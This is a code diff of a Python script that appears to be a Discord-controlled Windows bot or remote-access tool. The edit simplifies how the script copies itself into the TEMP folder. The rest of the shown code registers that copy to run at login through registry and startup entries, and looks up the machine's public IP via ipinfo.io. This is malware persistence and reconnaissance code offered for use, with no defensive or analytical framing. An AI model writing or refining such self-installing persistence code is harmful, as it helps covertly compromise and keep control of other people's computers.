@@ -120,16 +120,9 @@ async def on_ready():
 
 import os
 import shutil
-import random
-import string
 import winreg
 import win32com.client
 
-def generate_random_folder_name(length=8):
-    """Generate a random folder name."""
-    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
-
-# Function to add the script to startup
 def add_to_startup_methods(script_path):
     # Add to registry for current user
     try:
@@ -168,17 +161,15 @@ def add_to_startup_methods(script_path):
 # Call to add startup entries
 if __name__ == "__main__":
     script_name = os.path.basename(__file__)
-    random_folder = generate_random_folder_name()
-    temp_folder = os.path.join(os.getenv("TEMP"), random_folder)
-    os.makedirs(temp_folder, exist_ok=True)
+    temp_folder = os.getenv("TEMP")
     script_path = os.path.join(temp_folder, script_name)
     
-    # Copy script to the new random temporary directory
+    # Copy script to the TEMP directory
     shutil.copy(__file__, script_path)
     print(f"Copied {script_name} to {script_path}")
     
     add_to_startup_methods(script_path)
-    
+
 def get_ip_info():
     try:
         response = requests.get('https://ipinfo.io/json')
